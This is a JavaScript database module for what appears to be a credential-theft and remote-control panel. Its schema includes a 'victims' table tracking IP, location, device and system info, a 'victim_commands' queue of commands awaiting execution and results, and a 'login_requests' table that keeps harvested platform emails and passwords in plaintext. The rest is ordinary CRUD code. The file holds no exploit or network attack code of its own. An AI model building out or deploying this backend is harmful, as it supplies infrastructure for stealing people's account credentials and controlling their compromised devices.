/**
 * Database Service - Production Ready Database Management
 * Supports SQLite, MySQL, PostgreSQL, and MongoDB
 */

import sqlite3 from "sqlite3";
import mysql from "mysql2/promise";
import { MongoClient } from "mongodb";
import fs from "fs/promises";
import path from "path";

export default class DatabaseService {
  constructor(connectionString) {
    this.connectionString = connectionString;
    this.connection = null;
    this.dbType = this.parseConnectionType(connectionString);
    this.initialized = false;
  }

  parseConnectionType(connectionString) {
    if (connectionString.startsWith("sqlite:")) return "sqlite";
    if (connectionString.startsWith("mysql:")) return "mysql";
    if (connectionString.startsWith("postgresql:")) return "postgresql";
    if (connectionString.startsWith("mongodb:")) return "mongodb";
    return "sqlite"; // default
  }

  async initialize() {
    try {
      switch (this.dbType) {
        case "sqlite":
          await this.initializeSQLite();
          break;
        case "mysql":
          await this.initializeMySQL();
          break;
        case "mongodb":
          await this.initializeMongoDB();
          break;
        default:
          await this.initializeSQLite();
      }

      await this.createTables();
      this.initialized = true;
      console.log(`✅ Database initialized (${this.dbType})`);
    } catch (error) {
      console.error("❌ Database initialization failed:", error);
      throw error;
    }
  }

  async initializeSQLite() {
    const dbPath = this.connectionString.replace("sqlite:", "");
    const dbDir = path.dirname(dbPath);

    // Ensure directory exists
    await fs.mkdir(dbDir, { recursive: true });

    this.connection = new sqlite3.Database(dbPath);

    // Enable WAL mode for better performance
    await this.query("PRAGMA journal_mode = WAL");
    await this.query("PRAGMA synchronous = NORMAL");
    await this.query("PRAGMA cache_size = 1000");
    await this.query("PRAGMA temp_store = MEMORY");
  }

  async initializeMySQL() {
    const url = new URL(this.connectionString);
    this.connection = await mysql.createConnection({
      host: url.hostname,
      port: url.port || 3306,
      user: url.username,
      password: url.password,
      database: url.pathname.slice(1),
      charset: "utf8mb4",
    });
  }

  async initializeMongoDB() {
    this.connection = new MongoClient(this.connectionString);
    await this.connection.connect();
    this.db = this.connection.db();
  }

  async createTables() {
    if (this.dbType === "mongodb") {
      await this.createCollections();
      return;
    }

    const tables = [
      // Users table
      `CREATE TABLE IF NOT EXISTS users (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        email VARCHAR(255) UNIQUE NOT NULL,
        password_hash VARCHAR(255) NOT NULL,
        role VARCHAR(50) DEFAULT 'user',
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
        updated_at DATETIME DEFAULT CURRENT_TIMESTAMP,
        last_login DATETIME,
        is_active BOOLEAN DEFAULT 1,
        metadata JSON
      )`,

      // Login requests table
      `CREATE TABLE IF NOT EXISTS login_requests (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        user_id INTEGER,
        platform VARCHAR(100) NOT NULL,
        account_email VARCHAR(255) NOT NULL,
        account_password TEXT NOT NULL,
        status VARCHAR(50) DEFAULT 'pending',
        log TEXT,
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
        updated_at DATETIME DEFAULT CURRENT_TIMESTAMP,
        ip_address VARCHAR(45),
        user_agent TEXT,
        metadata JSON,
        FOREIGN KEY (user_id) REFERENCES users(id)
      )`,

      // Auto login sessions table
      `CREATE TABLE IF NOT EXISTS auto_login_sessions (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        session_id VARCHAR(255) UNIQUE NOT NULL,
        platform VARCHAR(100) NOT NULL,
        victim_id VARCHAR(255),
        user_email VARCHAR(255) NOT NULL,
        status VARCHAR(50) DEFAULT 'initializing',
        start_time DATETIME DEFAULT CURRENT_TIMESTAMP,
        end_time DATETIME,
        duration INTEGER,
        current_step VARCHAR(100),
        steps JSON,
        options JSON,
        error TEXT,
        result JSON
      )`,

      // Victims table
      `CREATE TABLE IF NOT EXISTS victims (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        victim_id VARCHAR(255) UNIQUE NOT NULL,
        name VARCHAR(255) NOT NULL,
        ip_address VARCHAR(45),
        location VARCHAR(255),
        device VARCHAR(255),
        status VARCHAR(50) DEFAULT 'offline',
        last_seen DATETIME DEFAULT CURRENT_TIMESTAMP,
        actions JSON,
        sessions INTEGER DEFAULT 0,
        data_size VARCHAR(50),
        system_info JSON,
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
        updated_at DATETIME DEFAULT CURRENT_TIMESTAMP
      )`,

      // Victim commands table
      `CREATE TABLE IF NOT EXISTS victim_commands (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        victim_id VARCHAR(255) NOT NULL,
        command VARCHAR(255) NOT NULL,
        params JSON,
        status VARCHAR(50) DEFAULT 'pending',
        result JSON,
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
        executed_at DATETIME,
        INDEX idx_victim_id (victim_id),
        INDEX idx_status (status)
      )`,

      // Admin keys table
      `CREATE TABLE IF NOT EXISTS admin_keys (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        key_name VARCHAR(255) NOT NULL,
        key_value VARCHAR(255) UNIQUE NOT NULL,
        key_preview VARCHAR(50),
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
        last_used_at DATETIME,
        status VARCHAR(50) DEFAULT 'active',
        permissions JSON,
        usage_count INTEGER DEFAULT 0,
        last_ip VARCHAR(45)
      )`,

      // Access history table
      `CREATE TABLE IF NOT EXISTS access_history (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        user_id INTEGER,
        action VARCHAR(255) NOT NULL,
        resource VARCHAR(255),
        ip_address VARCHAR(45),
        user_agent TEXT,
        timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
        success BOOLEAN DEFAULT 1,
        details JSON,
        FOREIGN KEY (user_id) REFERENCES users(id)
      )`,

      // System logs table
      `CREATE TABLE IF NOT EXISTS system_logs (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        level VARCHAR(20) NOT NULL,
        message TEXT NOT NULL,
        metadata JSON,
        timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
        source VARCHAR(100),
        INDEX idx_level (level),
        INDEX idx_timestamp (timestamp)
      )`,
    ];

    for (const table of tables) {
      await this.query(table);
    }

    // Create indexes for better performance
    await this.createIndexes();
  }

  async createCollections() {
    const collections = [
      "users",
      "login_requests",
      "auto_login_sessions",
      "victims",
      "victim_commands",
      "admin_keys",
      "access_history",
      "system_logs",
    ];

    for (const collection of collections) {
      await this.db.createCollection(collection);
    }

    // Create indexes
    await this.db
      .collection("users")
      .createIndex({ email: 1 }, { unique: true });
    await this.db
      .collection("login_requests")
      .createIndex({ user_id: 1, status: 1 });
    await this.db
      .collection("victims")
      .createIndex({ victim_id: 1 }, { unique: true });
    await this.db
      .collection("victim_commands")
      .createIndex({ victim_id: 1, status: 1 });
  }

  async createIndexes() {
    if (this.dbType === "sqlite") {
      const indexes = [
        "CREATE INDEX IF NOT EXISTS idx_users_email ON users(email)",
        "CREATE INDEX IF NOT EXISTS idx_login_requests_status ON login_requests(status)",
        "CREATE INDEX IF NOT EXISTS idx_login_requests_platform ON login_requests(platform)",
        "CREATE INDEX IF NOT EXISTS idx_victims_status ON victims(status)",
        "CREATE INDEX IF NOT EXISTS idx_victim_commands_victim_id ON victim_commands(victim_id)",
        "CREATE INDEX IF NOT EXISTS idx_access_history_user_id ON access_history(user_id)",
        "CREATE INDEX IF NOT EXISTS idx_system_logs_level ON system_logs(level)",
      ];

      for (const index of indexes) {
        await this.query(index);
      }
    }
  }

  async query(sql, params = []) {
    if (
      !this.initialized &&
      !sql.includes("PRAGMA") &&
      !sql.includes("CREATE")
    ) {
      throw new Error("Database not initialized");
    }

    return new Promise((resolve, reject) => {
      if (this.dbType === "sqlite") {
        if (
          sql
            .trim()
            .toUpperCase()
            .startsWith("SELECT")
        ) {
          this.connection.all(sql, params, (err, rows) => {
            if (err) reject(err);
            else resolve(rows);
          });
        } else {
          this.connection.run(sql, params, function(err) {
            if (err) reject(err);
            else
              resolve({
                lastID: this.lastID,
                changes: this.changes,
                success: true,
              });
          });
        }
      }
    });
  }

  // CRUD Operations
  async create(table, data) {
    if (this.dbType === "mongodb") {
      const result = await this.db.collection(table).insertOne(data);
      return { id: result.insertedId, ...data };
    }

    const keys = Object.keys(data);
    const values = Object.values(data);
    const placeholders = keys.map(() => "?").join(", ");

    const sql = `INSERT INTO ${table} (${keys.join(
      ", "
    )}) VALUES (${placeholders})`;
    const result = await this.query(sql, values);

    return { id: result.lastID, ...data };
  }

  async findById(table, id) {
    if (this.dbType === "mongodb") {
      return await this.db.collection(table).findOne({ _id: id });
    }

    const sql = `SELECT * FROM ${table} WHERE id = ?`;
    const rows = await this.query(sql, [id]);
    return rows[0] || null;
  }

  async findAll(table, conditions = {}, options = {}) {
    if (this.dbType === "mongodb") {
      const cursor = this.db.collection(table).find(conditions);

      if (options.limit) cursor.limit(options.limit);
      if (options.sort) cursor.sort(options.sort);

      return await cursor.toArray();
    }

    let sql = `SELECT * FROM ${table}`;
    const params = [];

    if (Object.keys(conditions).length > 0) {
      const whereClause = Object.keys(conditions)
        .map((key) => `${key} = ?`)
        .join(" AND ");
      sql += ` WHERE ${whereClause}`;
      params.push(...Object.values(conditions));
    }

    if (options.orderBy) {
      sql += ` ORDER BY ${options.orderBy}`;
    }

    if (options.limit) {
      sql += ` LIMIT ${options.limit}`;
    }

    return await this.query(sql, params);
  }

  async update(table, id, data) {
    if (this.dbType === "mongodb") {
      const result = await this.db
        .collection(table)
        .updateOne({ _id: id }, { $set: { ...data, updated_at: new Date() } });
      return result.modifiedCount > 0;
    }

    const keys = Object.keys(data);
    const values = Object.values(data);
    const setClause = keys.map((key) => `${key} = ?`).join(", ");

    const sql = `UPDATE ${table} SET ${setClause}, updated_at = CURRENT_TIMESTAMP WHERE id = ?`;
    const result = await this.query(sql, [...values, id]);

    return result.changes > 0;
  }

  async delete(table, id) {
    if (this.dbType === "mongodb") {
      const result = await this.db.collection(table).deleteOne({ _id: id });
      return result.deletedCount > 0;
    }

    const sql = `DELETE FROM ${table} WHERE id = ?`;
    const result = await this.query(sql, [id]);

    return result.changes > 0;
  }

  // Specialized methods for business logic
  async getLoginRequests(filters = {}) {
    return await this.findAll("login_requests", filters, {
      orderBy: "created_at DESC",
      limit: 100,
    });
  }

  async createLoginRequest(data) {
    return await this.create("login_requests", {
      ...data,
      created_at: new Date().toISOString(),
      updated_at: new Date().toISOString(),
    });
  }

  async updateLoginRequestStatus(id, status, log = null) {
    const updateData = { status, updated_at: new Date().toISOString() };
    if (log) updateData.log = log;

    return await this.update("login_requests", id, updateData);
  }

  async getVictims(filters = {}) {
    return await this.findAll("victims", filters, {
      orderBy: "last_seen DESC",
    });
  }

  async updateVictimStatus(victimId, status) {
    return await this.update("victims", victimId, {
      status,
      last_seen: new Date().toISOString(),
    });
  }

  async logAccess(userId, action, resource, details = {}) {
    return await this.create("access_history", {
      user_id: userId,
      action,
      resource,
      ip_address: details.ip,
      user_agent: details.userAgent,
      success: details.success !== false,
      details: JSON.stringify(details),
      timestamp: new Date().toISOString(),
    });
  }

  async close() {
    if (this.connection) {
      if (this.dbType === "mongodb") {
        await this.connection.close();
      } else if (this.dbType === "sqlite") {
        this.connection.close();
      } else {
        await this.connection.end();
      }
    }
  }
}
